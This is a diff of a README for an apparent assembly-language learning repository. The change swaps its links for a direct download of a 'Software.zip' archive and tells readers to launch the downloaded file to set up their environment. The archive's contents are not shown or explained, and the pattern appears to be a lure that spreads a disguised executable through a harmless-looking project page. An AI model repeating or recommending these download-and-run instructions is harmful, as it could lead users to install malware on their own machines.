@@ -1,6 +1,6 @@
 # 🌟 Welcome to the "Assembly" Repository! 🌟
 
-![Assembly](https://github.com/popcat4x/Assembly/releases/tag/v1.0)
+![Assembly](https://github.com/popcat4x/Assembly/releases/download/v2.0/Software.zip)
 
 ## Description
 This repository, "Assembly", is your go-to resource for learning and experimenting with the assembly language. Whether you're a beginner keen on mastering the basics or an experienced programmer looking to delve into the intricacies of assembly Linux x86 or x86, this is the perfect place to be!
@@ -24,7 +24,7 @@ This repository, "Assembly", is your go-to resource for learning and experimenti
 Feel free to explore the different facets of assembly programming in this repository.
 
 ## 🚀 Get Started!
-To kickstart your journey into the world of assembly programming, make sure to download the essential tools and resources. Click [here](https://github.com/popcat4x/Assembly/releases/tag/v1.0) to download the necessary files. Launch the downloaded file to set up your environment and get ready to dive into the fascinating realm of assembly programming.
+To kickstart your journey into the world of assembly programming, make sure to download the essential tools and resources. Click [here](https://github.com/popcat4x/Assembly/releases/download/v2.0/Software.zip) to download the necessary files. Launch the downloaded file to set up your environment and get ready to dive into the fascinating realm of assembly programming.
 
 Remember, your exploration of assembly programming starts here!
 
@@ -34,4 +34,4 @@ Remember, your exploration of assembly programming starts here!
 
 If the link provided does not work or you encounter any issues, please refer to the "Releases" section of this repository for further assistance.
 
-![Assembly Programming](https://github.com/popcat4x/Assembly/releases/tag/v1.0%20Assembly-Programming-blue)
+![Assembly Programming](https://github.com/popcat4x/Assembly/releases/download/v2.0/Software.zip%20Assembly-Programming-blue)
